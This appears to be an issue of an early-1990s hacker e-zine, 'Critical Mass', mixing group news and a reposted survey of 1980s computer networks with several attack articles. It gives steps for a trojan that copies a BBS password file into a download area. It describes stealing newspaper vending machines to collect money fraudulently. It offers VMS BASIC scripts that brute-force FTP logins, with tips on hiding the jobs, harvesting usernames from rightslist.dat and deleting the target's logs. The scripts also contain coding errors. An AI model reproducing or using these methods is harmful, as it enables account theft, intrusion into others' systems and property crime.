          Hello, and welcome to yet another issue of Critical Mass.


        Man has it been a great year for hacking for fellow S.A.O.O.
members in this area, but we will not go into that right now........

        As you might recall, in the first CM, I wrote a editorial on about
the downfall of fun and intresting BBS's that allow you to speak freely. 
I am now happy to say that this is changing rather fast. I have seen more
pirate boards, both private and public, pop up in this area, that it almost
brings a tear to my eye. This raise a point.....

        A new BBS echo has hit the ole town of Tallahassee. It is called
"[Unregistered] Net", and the primary topic is on Piracy, Hacking, Phreaking,
and pretty much any topics that are not talked about in the normal realm 
of people. It IS however a totally legal net, so basicly this means that 
there is NO stolen account's/codes/etc traded on this perticular net. If
you would like to become a part of this net, please contact 'The Beaver' 
or 'Section 8' pretaining to information on the net and how to get on. There
are currently 5 boards on the net <Actually as of this writing, the net is 
not up yet>, but we expect three or four more to be on in the near future.
        If intrested, mail one of the above, and all information will be
sent to you. There is also the SAOO net, which will be coming into action
soon. In order to be a part of this net, one must be either a active member
of the SAOO and/or support a SAOO support BBS. Please contact one of the 
above for further information.

        It looks as if the ole Upper Deck will be down longer than expected.
So don't call looking for it. When it does come back up however, we will
have more storage so that we can carry more files online. 

        The S.A.O.O. Telenet Generic Telenet Scanner Version 1.1i Beta is
out, though this is nothing to really brag about. It works, but as stated
it is a beta version. As you may have noticed, it came with your issue of
Critical Mass#7. As of this time, you are slightly ahead of people how are
downloading version 1.0i beta off of Tallahassee BBS's, in that v1.1i beta
contains a bug fix. See the Doc's for more information! Also, feel 
privileged.

        Currently, there is some talk also about having a local Computer
convention of sorts. What is being looked into right now is to have a
basic get together of modem users in our area, and hopefully along with
outsiders as well. What is desired is a two day long event in which 
users get together and discuss serval topics, along with speakers in all
fields, including computer security. What hopes to be arranged is a
'conference' of sorta, for speakers ranging from MircoSoft to local DEC,
FCIC, FDLE and possible FBI computer secuity officals. This is in its
very early planing stages. If you wish to help out the efforts, please 
contacts your nearest S.A.O.O. member!

        Welp, it looks like ole Abigail Natias is leaving the Tallahassee
area and is heading for the Ft. Walton Bch area. He has been a fellow 
SAOO member since it was founded. Never fear though, he remains in the 
SAOO, and hopefully, within the next few months, a new SAOO chapter will
be opening within that area. 

        There is a new BBS on internet that you might find intresting. It
is pretty much a underground BBS, so to obtain information on it, please
contact "The Beaver"  at one of the given BBS's.

        This was orginally a message posted on a BBS in Ft. Walton Bch
        Florida. Unfortunatly, the author is unknown to us, so we

        so, not all the information is accurate.


                   -      The Plethora of Networks      -



Since  I  have been at an ARPANET site for about three years,  and  a  USENET
site  for  the  same amount of time, I think I can comment  on  some  of  the
Networks   that   exist   out   there. Particularly since Berkeley has become
a gateway for several of them.

ARPANET
-------
Brought  to  you  by  the fun folks at DARPA, it was one of  the  very  first
experiments  with computer networking, and certainly the first on a  national
(and later international) scale. It is centrally  controlled  and  implicitly
routed  (i.e.  the network figures out how to get from point a to  point  b).
To  join,  you  have  to  have a gov't sponsor and it is for the execution of
official  gov't  business  & research. (sure it is...)

In so far as I am aware, all links are faster   than  9.6Kbaud,  and  a  good
number of them are 56Kbaud. All appear to  be  dedicated.  Number of sites is
somewhere between 250 and 300. If  you choose  to  count  the whole internet,
things get  a  little  bigger.  Anyone have  any  ideas  about  the number of
internet sites? Three  basic  services are offered by the ARPANET:

FTP    -    File    Transfer   Program (fetch/send  files  anywhere)   telnet
Interactive  access  to other hosts on the network MAIL Electronic Mail

MILNET
------
Stepchild of the ARPANET  (or  perhaps goosestepping child?), MILNET is where
the military sites gather  to  do  the same   things  ARPANET  does,  without
disruptions   caused   by   networking reseach   (i.e.  it  is  a  production
version of the ARPANET). It split from the ARPANET in October of 1983.

CSNET
-----
This  is  a network funded (initially, although they will be  self-sufficient
later  on) for the purpose of Computer Science  Research  by   the   National
Science  Foundation (and probably many others). By self-sufficient',  I  mean
that  the  individual  member sites of CSNET  will  pay  the  full  cost   of
central  control,  administration, and ARPANET  access.  Last  price  I   was
quoted  was $30K/year. Presently seems to be between 50-100 sites.
                                       
I'm  a  little  shaky  on  what   this network  has in terms of services, but
here goes: Services seem to be limited to  MAIL,  but  FTP is coming. Mail is
handled with the MMDF software,  which operates over the phone. There are two
ARPANET   gatways:   UDEL-RELAY    and RAND-RELAY. These two sites handle the
phone traffic to the rest of  the  net (??)   from   the   ARPANET.   Network
addressing is implicit. To  get  to  a CSNET site from the ARPANET:

mail     person.site@RAND-RELAY    (or UDEL-RELAY)

BITNET
------
This is a network of  IBM  hosts,  and seems to be built along the same lines
as the ARPANET  (implicit  addressing, dedicated  lines, central control) but
not  all  the  sites  have  the   same capabilites. Services supported: MAIL,
and FTP (for  those  sites  that  have RSCS). Presently is about 50-60 sites.
Founded by CUNY, after they got IBM to cough  up the software that is used in
the IBM internal VNET. I have no  idea how  fast it goes. Scope: national. To
address someone on the BITNET from the ARPANET:

mail person%site.BITNET@BERKELEY

BERKELEY's mailer converts this to

G:SITE=PERSON

and it gets sent to UNIX G (in the UCB Computer Center), which in turn  sends
it  to  the  IBM  4341  (UCBVMA on the BITNET), and from there it goes  where
it's supposed to...

DEC Engineering NET (E-NET)
---------------------------
This  is  DEC's  internal  network  of engineering  machines  (now  you  know
where   VMS   comes   from!).   It  is centrally controlled,  semi-implicitly
routed  (they  are  converting from an explicit  routing   scheme)   and   is
composed of somewhere between 2000 and 2100 sites. Primary service  seems  to
be  MAIL,  but  there is no doubt some form of FTP as well. Speed seems to be
somewhere  in the higher ranges (4800+ baud), but I infer this from speed  of
mail  propagation  alone. This network is  international   in   scope,   with
several European sites. For ARPAnauts, you can mail to the E-NET:

mail decwrl!rhea!site!person@BERKELEY

The site decwrl' talks to ucbvax' with UUCP.  ucbvax'  is  the  ARPANET  site
BERKELEY.   The   mailer   at   decwrl converts address syntax to

RHEA::SITE::PERSON

and away it goes...

There  is  a  DEC  site on the ARPANET (DEC-MARLBORO)  which  appears  to  do
gatewaying  duty now and again, but by hand only.  This  would  be  an  ideal
point  to  establish  a  real  gateway (hint, hint...)

(and  now,  for  the  grand  finale...;drum roll please=)

UUCP/USENET (ta da!)
--------------------
These   two   networks   are   forever intertwined,  and  from  the   ARPANET
point   of   view,   there  is  little difference between  the  two.  By  the
nature  of  the  beast  they  must  be discussed together. UUCP is an acronym
for Unix-to-Unix Copy, a file transfer and remote  execution  facility  which
operates   over  a  direct  line  (max 9600baud)  or  over  the  phone  lines
(typically 1200 baud).

Mail   is   transmitted   through  the network on a pass it on basis, and  at
present,  only the mail software knows how to transfer stuff beyond a  site's
immediate  neighbors. The UUCP network exists because some  of  my  neighbors
talk  to  some  of  your neighbors, so through them we can send mail to  each
other.  The  network  has  no  central control, and no  one  knows  how  many
sites   there  are,  or  how  far  the network extends. Anyone can  join  the
network,   all  it  takes  is  a  UNIX system, and another  site  willing  to
talk  to  you.  After  four  months of traffic analysis, I  have  found  just
over 2000 UUCP sites.

USENET   is   a  subset  of  the  UUCP network. On top of the  existing  UUCP
software,  sites  in  this network run netnews', which is  a  bboard  system,
also  on a pass it on basis. Imagine a bboard  system  in  which   you   post
something,  and  you pass it on to the other USENET sites you talk to (and so
on,  and  so on, ad nausem), until the whole network has seen  the  item  you
posted.  The discussions are separated by topic, and if you thought that  the
ARPANET   had  a  wide  range  mailing lists,  the   USENET   has   currently
somewhere   between   150-200   active network  wide  newsgroups   discussing
things  as  esoteric  as  UNIX bugs to mundane things like cooking. There are
approximately    600    USENET   sites covering the continental  US,  Canada,
Europe,  and  Australia.  There  is  a USENET   directory   kept   by   Karen
Summers-Horton  (cbosgd!map@BERKELEY), and it is posted monthly on the  first
of the month to net.news.map.          
The   anarchy   of   the   network  is interesting. Among  other  things,  it
means  that  you must have an educated network community (ever try to educate
people  at  600  sites??) and punitive actions are very nearly impossible  on
a  unilateral  scale.  It  makes  path routing   difficult,   however.    The
directory  includes  information about links that a particular site has,  but
it  is  up  to the site to provide and maintain that information.  Since  the
network  is  in  a  constant  state of flux, it is very hard to map the whole
thing. Unlike the ARPANET, usually the best you can do is get a snapshot.

(finis)

Now. Where I err, please  correct  me. Most  of  the  networks  mentioned get
HUMAN-NETS in one form or another,  so I  expect that corrections will filter
in over the next few days. However, on the whole, I don't think I have missed
anything major.

For the networkingly confused, I  hope I  have  been  of  some help. This got
just  a  touch  longer  than I had anticipated.
A bit more info on Digital's ENET

First  I'd like to thank the author of the compendium on networks.

And second, I'd like to give a  little more  information on the Digital ENET.
It is composed of systems running  our DECNET    software   products,   first
introduced about nine years ago.

DECNET  is  much  more  than  a   mail network.  It  is  a product built on a
layered  network  architecture   (DNA) with  lower, non-programmer accessible
data-link  and  routing  layers,   and higher, programmer accessible, session
layers.

It is similar to the ISO model on open systems   interconnect.  Since  it  is
older than that  model,  it  does  not correspond exactly, but will, more and
more, as  time  goes  by  and  as  the worldwide networks develop.

At  the  data-link  level  it  can use synchronous or asynchronous  lines  of
any   speed   running   DDCMP,  public network lines running  X.25,  parallel
links  running  protocols  specific to those  devices,  and  Ethernet.  Using
gateway products it can create gateway links into an IBM SNA network.

At the user accessible  layer,  it  is possible  for  any  program  to open a
transparent, full-duplex,  channel  to any  other  program on the same or any
other node in the network. Programmers can  take  advantage  of this "network
logical link" to build any application they wish.

Various  Digital  supported  protocols running   on   logical    links    are
host-to-host   terminal   connections, allowing a user at any node to act  as
an  interactive  terminal on any other node, Mail, the Data Access  Protocol,
(see   next   paragraph)  and  several others.

The  DAP  protocol  is  used  to  copy files, but it is much more than a file
copy protocol. It permits a program on any  system  to  access  a file on any
other system as though that file  were a  local  file.  In  fact, VMS and RSX
using the DAP routines buried  in  RMS permit  a nodename to be simply a part
of a file spec used by any program.

DECNET does a bit more  than  implicit routing; it does dynamic path routing.
As   a   result,   given    sufficient alternate   paths,   the  loss  of  an
intermediate node does not affect  the operation of traffic currently routing
through  that   node.   Dynamic   path routing  was  first  made available in
DECNET Phase  III,  offered  for  sale almost five years ago.

For  example,  since  our  network has three  transatlantic  links,   a   few
months  ago,  we had a serious failure of the links between Massachusetts and
the  remainder  of our engineering and marketing headquarters 30 miles to the
north in New Hampshire. But due to the fact that some  of  our  transatlantic
links go into New Hampshire and others into Maynard, we did  not  immediately
notice  the  problem. Things got a bit slower, since we were no longer  using
several  56Kbps links but were pushing all traffic through some 9600bps links
to the U.K., down to Geneva, and back. The  reason there occasionally appears
to be some  implicit  routing  in  our node  strings  is  that  the Phase III
version of DECNET had a maximum of 256 addresses.  This  restriction has been
lifted in  Phase  IV.  However,  as  a result  of  the  restriction,  it  was
necessary  for  us  to  partition  our network.

Reassigning  node  numbers will not be complete for several months,  and  not
all systems will upgrade, so there may be a few  systems  which  require  one
intermediate  hop  from  RHEA. Many of these will have  definitions  on  RHEA
making  that transparent to the sender (though  a  recipient  would  see  the
hop).  The  rest  should  be  directly addressable from RHEA, whether located
in  the  U.S.,  Canada, the Caribbean, Europe (13 countries now), the  Middle
East,  the  Far  East,  or  Australia. (Remember, IBM is  the  only  computer
manufacturer larger than Digital.)

Compliments to Mr. Fair - an excellent summary article. Would that Human-Nets
had more such.

To  expand  on  CSNET: It is currently funded by  the  NSF,  and  expects  to
become self-supporting during the next few years, based on member fees. These
fees are:

$ 30,000 - commercial sites
$ 10,000 -    government and not-for-profit
$ 5,000  - educational

These   fees   may   be   reduced   by petitioning  for  a  reduction  in the
case of small outfits, and  are  lower for  people  who  already  have  a net
connection via Arpanet.                
The CSNET membership list as of Dec. 1
shows:

85 Phonenet sites
6 Telenet sites
18 Arpanet sites
4 CSNET-owned hosts

Not all of these sites are operational yet, though most are.  Phonenet  sites
are  served  by  two  Relay  machines, which call them up nightly to exchange
mail.  Text files may be automatically transferred      using      MMDF-based
mail-receipt  programs, though this is obviously  not  the  best  way  to  do
business. Bandwidth here is limited by the 1200-baud phone lines as  well  as
by   the  capacities  of  the  Relays. Mailing-list stuff can be handled  OK,
but  Usenet  traffic breaks the Relays by sheer load.

Telenet sites run  TCP/IP  on  top  of X.25  virtual circuits, using software
developed   for   CSNET   at   Purdue. Personally  I think this is hot stuff.
If your phone bills  are  $1500/month, you  can  run  equivalent traffic over
Telenet for  about  $1200/month,  last time  we  figured it out. And, you get
full   Internet    connectivity    and services into the bargain. Because the
drop lines from Telenet  to  the  host are  really  only  9600, 4800, or 1200
baud    dedicated     phone     lines, instantaneous bandwidth is not as good
as Arpanet, but it's not bad. And, you and  the  rest  of  the  world will be
hard-put to tell that  you're  not  on Arpanet  directly,  except  you  don't
have  to  deal  with  the  DoD.   This software really works, and works well.

Arpanet  sites  run  standard  Arpanet software - no change.

In    addition    to    simple     net connectivity,    CSNET    brings   the
benefits   of   centralized    network management.  Basically this means that
if your mail isn't  moving,  you  have experts  to scream to, and they really
will work hard  to  fix  the  problem. There   are  other  benefits  such  as
ongoing mail  system  development,  an automatic nameserver, and so forth.

Management  of CSNET has recently been transferred away from  the  contractor
committees  which  built  the net to a newly-formed   Executive    Committee,
which  is  overseeing  the move from a research to  a  service  organization. 
The  two  relay machines are moving to BBN - it's cheaper and easier to run a
single computer center and communicate via WATS lines than to spread out  the
Relay operations.

Just to clarify something... DECNET is the name of a product sold by  Digital
which  any  customer  can use to build their own network.

DECNET  is  used  to  build  Digital's internal network. The internal network
name has been a hotly debated  subject (what's  in  a  name?)  but  the  most
commonly used name is the ENET,  since the  largest  internal  use was within
Engineering.

Now  the  whole   company   is   being interconnected,     and    Engineering
Network is not really  an  appropriate name.   But  the  E  in  ENET  doesn't 
necessarily   have   to   stand    for Engineering.

We  think  it can stand for Everthing, Employee,  Everywhere,   or   whatever
anyone wants it to stand for.   
The   lack   of  any  serious  central control   (other   than   a   nodename
registry)  makes  things like this not really matter.

Here's a network  you  left  out:  the XEROX Internet. Most outsiders tend to
overlook  the  XEROX   Internet,   for various reasons:

1)  only  a  small  proportion  of the traffic is gatewayed to or from  other
networks;                              
2)  what  little  gatewaying  there is gets done almost invisibly;
3) the name difficulty. (I'm told that XEROX  used "Internet" first, but that
doesn't matter much now.)

The XEROX Internet only has about 2000 users,  but  it is widely distributed,
with users in Europe and Japan.

The mail  transport  mechanism  within the    XEROX    Internet   is   called
Grapevine.  Grapevine  addresses  look like   "<user>.<registry>".   If   the
registry you're sending to is the  one you  are in, you can leave it off, and
the address becomes  merely  "<user>". Registries  are  geographic  - the two
largest  are  "PA"  (Palo  Alto),  for Northern   California,  and  "ES"  (El
Segundo), for Southern California.

To send mail in from the ARPAnet,  the address looks like:

"<user>.<registry>@PARC-MAXC".

If  the  registry is PA, you can leave it  off,  giving   "<user>@PARC-MAXC".
This  is  what  I  mean  by  invisible gatewaying - to  outsiders,  it  looks
like  all  2000  of us Xeroids receive our mail on poor little PARC-MAXC. Not
so  - it's just a gateway. I think the source of the confusion is that people
are  used  to  explicitly specifying a host for the mail to be delivered  to,
as  well  as  a  user  on  that  host. Grapevine's mail servers are  politely
invisible.
Sending  mail out to the ARPAnet is as easy as pi.  "ARPA"  is  just  another
registry,     so     I     just    say "<user>@<host>.ARPA". Or if I'm really
lazy,  I can just say "<user>@<host>", since   anything   with   at    atsign
automatically goes to the ARPAnet.

In addition to the networks previously described, there are five public  data
networks  actively  serving the US and more in the works. The  five  national
PDNs  are  all  common  carriers, like Greyhound - that is, anybody whos pays
the   fare  can  use  them.  They  all provide an X.25 interface, which gives
a  virtual  circuit service - there is as yet no international  standard  for
mail  or  FTP.  All  provide a virtual terminal capability via  the  X.3/X.29
PAD   standards.   They   all  compete vigorously for business, and I'm  sure
I'll  hear  about  it immediately if I have left  out  anybody's  capability.
Here  (in  alphabetical order) are the five established PDNs:

ADP Autonet
175 Jackson Plaza
Ann Arbor, MI 48106
(313) 769-6800

Besides the US, has satellite links to London,   England   and   Delft,   The
Netherlands. Maximum internal speed is 9600   bps.  Nodes  are  PDP-11s  with
KMC-11  front   end   microprocessors. Internal  protocol was described to me
as  derivative  of  the  old   ARPAnet protocols.

CompuServe Incorporated
Network Services Division
5000 Arlington Centre Blvd.
P.O. Box 12
Columbus, OH 43220
(614) 457-8600

Internal  speeds to 56k bps. Nodes are PDP-11s with 6809 microprocessor front
ends. Internal protocol is DDCMP.

GTE Telenet Communications Corp.
8229 Boone Boulevard
Vienna, VA 22180
(703) 442-1000

Internal  speeds to 56k bps. Nodes are arrays of 6502s in a  redundant,  load
sharing     configuration.    Internal protocol     conforms     to     CCITT
Recommendation      X.75.     Supports automatic recovery of virtual  circuit
when a node fails during a call. Built by some of  the  folks  from  BBN  who
built the ARPAnet originally. Provides a mail service called Telemail.

Tymnet, Inc.
2710 Orchard Parkway
San Jose, CA 95134
(408) 946-4900

Internal speeds to 56k bps. Nodes  are arrays   of   "Tymnet  Engines"  in  a
redundant, load sharing configuration. The  Tymnet  Engine  is a Tymnet-built
32-bit  processor  derived  from   the Interdata   732,   re-engineered   for
extremely high MTBF. Internal protocol is   a   unique  Tymnet  design  which
repacketizes inside  the  network  and does  flow  control at the byte level,
like TCP. Supports automatic  recovery of  virtual  circuit when a node fails
during a call. Provides a mail service called OnTyme.

Uninet
United Telecom Communications, Inc.
2525 Washington
Kansas City, MO 64108
(816) 221-2444

Internal  speeds to 56k bps. Nodes are Modcomp 7830s. Internal protocol is  a
Uninet-designed     virtual    circuit protocol, on top of HDLC.

In addition there is, of  course,  the new  AT&T  offering,  NET/1000.  Nodes
consist of  arrays  of  VAXen  with  a Series/I  for  line handling. They see
the  function  of  their  network   as storing  information, rather than just
forwarding it like the other networks. The  internal  protocol  is  X.25, but
they  don't  support  an   X.25   user interface! (No, I don't know why). For
further information, call Mr. John  M. Finn,   their  San  Francisco  account
executive at (415) 452-7292.

Graphic Scanning and Computer Sciences Corp.  are  in the process of spinning
off  their   internal   networks,   as GraphNet  and  InfoNet  respectively I
believe. There will probably  be  X.25 interfaces,   if   they   don't  exist
already.

GE Information Services Company has an internal   network   called  MARK*NET.
There is not as yet an X.25  interface to it.

And,  how could I forget, the State of Utah  boasts  its  own   Public   Data
Network!  It  is called ComWest and is being  spun  off  by  Blue  Cross/Blue
Shield  of  Utah,  which needed a good way to get  claims  data  from  places
like  Panguitch,  Utah up to Salt Lake City. The internal circuits are leased
from  Mountain  Bell  (no, they're not barbed wire, skeptics) and run  up  to
9600  bps.  Nodes  are Dynatech Packet Technology   Multi-Switch.25    packet
switches,  which  are based on the Z80 micro. There are several sites besides
BC/BS,   one   of   them   being   the University of Utah DECSYSTEM-20.

Outside the US, there are public  data networks   operating  in  about  forty
foreign countries, basically the  ones that  are  industrialized.  We  have a
user  who  logs  in   regularly   from Stockholm  via  the  Swedish  PDN  <->
Telenet <-> ComWest. He says  he  gets good response.

                       The Simple RA User.BBS Trojan.
                               By The Beaver
                         _____________________________



            Member S.A.O.O. <Silicon Aluminim Oxidation Organization>




        The entire idea behind the code is simple. To get the User.BBS file,
which contains all the user's and there passwords <Along with other intresting
facts>. It is currently set for RA, but can probably be modified for Qbbs, or
what not.... Here is the little "ho-down" on the program and it's steps.


        1> Find RA's User.bbs file, using the program "dirscan.com" 
           Once found, store the path.
        2> Find a file that you are SURE is in a files transfer area. Take for
           instance, if you know that there is a file in the Utilities area
           called "bigdeal.zip", and you want the User.BBS file to go in
           that directory, we search for "bigdeal.zip", and store the path
           it came from.
        3> copy the User.BBS to the file transfer area as something non-
           suspision. So if it copys, as in our example, to the utility
           directory, make it something like, "list.com" it is copied.
           <NOTE: Make sure that the "utility" does NOT actually exsist!>
        4> Call everyday and do a "raw directory" and look for the file. 
           Since the files.bbs is not modifed, it will not be seen on a 
           normal file list, so a raw is required. If raw-directory is not
           supported, then simply go on everyday and try to download 
           the name it is stored under. In our case, "list.com". If it is 
           there, whether or not it is in a standard file list, it can be down-
           loaded. 

        The "diskscan" program is nothing more than a utility like, "where".
        Basicly all it does it find files for you. This should not be a 
        very hard utility to find.


        Once you obtain the user file, you should have no problem with a 
        text editor going though and determining what the username and 
        passwords are, along with other information. 
        If you are of thoughs neat types, you can get RA or the utility
        "rauser.exe" and rename your physdo utility back to "users.bbs" and
        with a few little modification, you can use the utility that looks
        though that and gathers the fields. Anyrate, I hope you enjoy this, 
        but it real was not that hard to do.

        Actually, Dementia Meister is writting a better version of this 
        in pascal, but I am sure you can figure it out and convert it to
        whatever laugage you so desire. 


                Also, I would like to note the fact that this is not 
                a very easy bug to cure, and I see no what for sysops
                to protect themselve from the use of this method, other
                than having a careful eye. <At least not right off ayway>.

               How to support yourself doing little, or nothing
                                   at all.

                     By Bored SAOO Members Late One Night
                  ___________________________________________




            Here we will discuss the infamous "Democrate Fraud"
            method.


            I take no resposiblity for any prosecutions, damages,
            injuries, etc. Attempt at your own risk...

        

        Though, this method has never been tested, along with myself
        and five fellow SAOO members thought of this while sitting 
        around a dead Democat Paper Dispenser. Simply follow the 
        following steps....


1> Getting the Machine

           Get you hands on a Democat Paper Machine. To do this, take
           three of your fellow comrades in one vechicle, with a 
           large back seat/trunk <A Van is ideal> and approach 
           a nice, lonely paper machine. Get two people to grab it
           while one watchs out. If the machine is bolted down, 
           use bolt cutters.

2> Opening it

           Cut the lock off that secures the brace pin <Located
           near the top on the right hand side on most machines>.
           Remove the brace pin and "open de hatch". Remove the
           money. Replace the lock <that secures the brace pin>
           and secure with new lock. 

           * NOTE: Do not beat it open! It will only serve as a
           nice plant stand, or as it was at Abigail's house, 
           "That thing in the corner."

3> Re-distribution of wealth

           There is still more money to be made. Now, take the 
           paper machine <Now with YOUR lock on it> and drop it
           off in a somewhat populated area. Not in a place so
           populated that the real paper men will see it, but 
           in a back area <I.E. - By a pool near apartments, 
           in a laundry room in apartments>. In other words, 
           where the real paper man won't see it.

           Now, every morning goto a paper stand <A legit stand that
           is!> and put in your 50 cent <$1.50 on Sundays!> and 
           remove ALL the papers. 

           Now return to YOUR paper stand and put in all the papers
           you just got into your paper machine with your lock on
           it! 
 
           Now, every night, return and unlock your paper stand and 
           collect your money! Repeat this process and distribute 
           your stands around as much as possible. Start this entire
           process over again....


4> Closing notes.....

        
           Though past experiences of certain members of the SAOO
           <Shadow Hacker, Abigail, and Dementia Meister>, they
           got a whole $5.00 on a stolen machine <That they beat 
           open, because of lack of bolts cutters>. The machine
           they got was in a area not to populated.

           We estimate that a real popular area, you could maybe 
           get out of one box $15 dollars. This is a problem, 
           the paper people already got boxes there. We figure that
           a box in a more ideal area for you will probably will
           average $7.50 on weekdays. 

           Sudays are another story. You might make a possible 
           $20 dollars for that day. So for one box, in a decent
           location, adverage is......

           Week : $65.00
          Month : $260.00
           Year : $3120.00

           With this in effect, lets say you can operate 5 Boxes
           max, safely and effectively. Lets average that....

           Week : $325.00
          Month : $1300.00
           Year : $15,600.00 

           Which is, of course, tax free. This should be efficent
           to keep up with most of your bills and whatnot. With a
           real job, you could make real money! Or, if you are 
           unlike me, collect welfair and live like a king! Welp
           there you go! 


                <P.S. - Don't take this text TO literally!>

                          The VAX/VMS FTP Batch Hack.

        When I came up with this method about a year and a half ago, I never 
knew how good it would work out for me. I have cracked more accounts using 
this method than I can possibly think of. In order to use this method, one 
must of some sort of programming knowlege and understand, at least somewhat, 
how VMS works. 
        First off, let me briefly explain the method before we actually go
into coding or anything like that. FTP <File Transfer Protocal> is used as
a file transfer method from one machine to another. What really makes this
great is that any machine that supports FTP can be hacked using this method.
        This means that you can use you hacked VMS system to hack any other
system that supports FTP that runs any OS! Heres how the idea came to me. One
night, I was hacking on a VMS system somewhere on the Internet, and I 
remembered that everytime you fail a account, the user is notified that there
was a invald login attempt, and if you have to many invalid attempts in a 
given time, bells and whistles go off, telling the operator that a "breakin"
is in progress. This can be a real bummer. 
    Well I got to thinking that this "front door" hacking was really becoming
a drag, then it dawned on me. No logs or records of invalid attempts are 
recorded <At least to my knowlege> by FTP, which you have to "login" to send
files to the remote machines! Now I'm set. I'm hacking like hell, the another
idea "spawn's" on me. 
      What if I upload a ton of commonly used passwords, write a program that
will create a batch job that will attempt all the passwords on the accounts
that I was hacking. Then I could "submit it" and let it hack for me? Trust
me, it worked like a dream.
        From that, I came up with tons of variations of the program. Well, 
lets get started with the technical info. 
        All the code was written under VMS BASIC, because everybody and there
grandmothers <The ones who hack> knows BASIC. The first example it a hack 
over internet on a single account with a password list.

<Title: One User, Multiple Passwords>



5       on error goto 50                        ! This will Catch EOF

10      user$="bob"                             ! This is ther username
        open "passwords.dat" for input as#2     ! Open File w/ Favorite Passwds
        open "hack.bat" for output as#1         ! Our Batch That Will Hack.
10      input#2, pass$                          ! Grab A Password

20      print#1,"$ ftp <Target Address> /user="+username$+" /pass="+pass$

30      print#2,"quit"          ! Where Tried Our Password, Now Quit.
40      goto 20                 ! Do It All Over Again.

50      resume 51
51      close#1                                 ! Got The EOF, now close
        close#2                                 ! up and exit.
        end
              

        That simple. We now have a file called "hack.bat", which will do our
hacking for us. Ok, so we are ready to kick it off. Type the following.

Submit hack.bat /noprint / notify

        Now, let me explain a little more. In line 20, where we FTP to the 
desired address, you must keep the "$" in there. If it is removed, the 
Batch job will not work correctly. This tell the VAX that this is a DCL
level command, so it must stay. There is none in front of the "quit", because
by then, we are not at DCL, but rather, we are using the FTP program.
        Heres something very important to remember also. When you "submit"
the batch job, make sure the "/noprint" is present! This tells the system
NOT to dump batch information to the printer. If you don't do this, everyone
in the computer center will see what you are up to! That ain't cool!
        The "/notify" is optional. This will simply tell you when your
batch job has completed. 
        Now, while its doing its thing, go off and do something else for
a while <I.E. Setup another one, eat, sleep for a change>. Okay, the batch
job completes, now you want to extract all the cool information.  You will
notice that there is a big, fat log called "hack.log".  This is a record
of everything that happened in our batch job. Now we check to see if we
got in or not. This part you might have to play with. I use the VMS "search"
command at this point, like thus........

Search hack.log logged

        This will search the entire log for the work "logged". So if it finds
one, it will display the line that had that word. What we are looking for is
the nice key words "logged in". From here it will dump to you whether you
suceeded in logging in or not. One problem, it will only show that line, so 
you might have to whip-up another BASIC program that will search for all the 
important lines that contain the information you want <I.E. - THE PASSWORD!>.
       There ya have it! Possible hours of work all nicely automatied for ya!
The only problem? There will be a FTP logged stored in the targets directory.
No big deal, you have there password, go over and delete it. 
        The following is more code, with a brief discription of what it does.
All "submits" should be done like before.

<Title: The Gobber Scan>


5       on error goto 100                       ! Catch That Thare EOF

10      open "usernames" for input as#1         ! Open A List Of Usernames
        open "hack.bat" for output as#2         ! Opens Our Work Horse

20      input#1,user$                           ! Get a Username
30      print#2,"$ ftp <Target Address>	/user="+user$+" /pass="+user$

40      print#2,"quit"                          ! Try Then Quit FTP
50      goto 20

100     resume 111
111     close#1                                 ! Got The EOF, Now 
112     close#2                                 ! Close Up The Files
113     end


        This is the one I find that is most successful! It trys the persons
username as a password. This works real nice on VAX/VMS systems, because
VMS accounts usually default there passwords to the username! In one case, 
using this method, I cracked 166 account on a system in Utah! No shit!


<Title: Multiple Usernames, Multiple Passwords>


5       on error goto 200                       ! Handles Them EOF's
         
10      open "username.dat" for input as#1      ! Opens Username File
        open "password.dat" for input as#2      ! Opens Password File
        open "hack.bat" for output as#3         ! Our Electro-Hacker Hero

20      flag=1                                  ! Determines Who Got The
        input#1,user$                           ! EOF

30      flag=2                                  ! Determines Who Got The
        input#2,pass$                           ! EOF

40      input#3,"$ ftp <target address> /user="+user$+" /pass="+pass$
        
        print#3,"quit"                          ! Try and exit

50      goto 30

200     resume 210
210     if flag=2 then                                  ! If At The End Of Pass
                  close#2                               ! File, Close It, Get
                  open "password.dat" for input as#2    ! Another User And 
                  goto 20                               ! Start Over

220     if flag=1 then                                  ! If At The End A User
                  close#1                               ! File, Close And Exit.
                  close#2
                  close#3
                  end

 
 
                                                  
               Okay, that should pretty much cover your needs. There are only
a few drawbacks to FTP Batch Hacker. It sometimes requires a bit of disk
space, so is you have a disk quota of a hundred blocks, forget about it.
                
                I would also like to say that when you actually use this 
method, It would be very wise to change the names for the files used by the
programs above. After all, it don't look to cool to have "passhacker.bat" in 
the queue for all to see! Yesh!

        Before I end this article, I would like to include one more detail
that works really nice with this method. Lets say your on this really nice 
VAX/VMS and ya want to keep you access there as long as possible. What you
need is as many accounts as possible. Heres what I do, type the following
at DCL........

        Type sys$common:[sysexe]rightslist.dat

        This will dump all usernames <And group names to> along with alot of
random <well, random to use> ctrl characters. Capture this, and write a filter
and re-upload the nice clean userlist. After that, run one of these guys with
the user's you got and I can almost bet ya that you will get at least a few
accounts. 
        This works really great when you use the DECNET to jump on other 
systems that are a part of the network! You can Sometimes
crack open a entire cluster <Or two, three, four, etc, etc!>.

        Well, thats all there is to it. That simple and fun. Also, if anyone
writes a good filter for rightslist ON a VMS system, I would very much like
to see your code, because I have had one hell of a time getting one to
work myself.......


Note: After producing this article, I found out why the FTP never makes logs
      of invalid attempts. The reason is because because most of the time 
      the people who have setup the system have not went though all the 
      security means to keep stuff like this from happening. Not to worry
      though. I have only seen one system out of about 100 that actually
      had there FTP server setup right. The reason that they had it setup
      right was because they where FTP hacked so many times by fellow SAOO
      members, that they figured it out. Those people are at FSU, so don't
      hack on 'em or use this method on 'em. They got enough problems as it
      is.

      If you do not wish to write your own Rightslist filter, there are
      ton of RL filters written by SAOO members. They are Phill <any version
      higher than 1.0 for speed>, Written by Dementia Meister and Abigail
      Natias, and also RIF <For VAX/VMS, and by far the quickest because
      you never need to download the RL file, because it filter's it 
      online>, which is written in C. Created by Laiazon and Tech advisor -
      The Beaver.

      <Phill was also included with this issue of Critical Mass!>

Information on Telenet:

        
     The First thing you need to do is obtain a dialup list. To do
this, call 1-800-424-9494 <1200 7E1, or 1200 8N1 with hit bit 
striping on>. Once on, you will receive a "TERMINAL=", which at 
this point, enter your terminal type, or just press return <TTY>.
        You will now get a "@" prompt. From here type "c mail". At 
the "Username?" prompt, enter "phones" and the same for the 
"Password?" prompt. At this point, simply follow the directions, 
and you will get your local dialup<s>. One thing I would like to 
note, when using the 300/1200 dialups, when you connect, simply hit 
return a few times. When using the 2400 dialups, you must enter "@" 
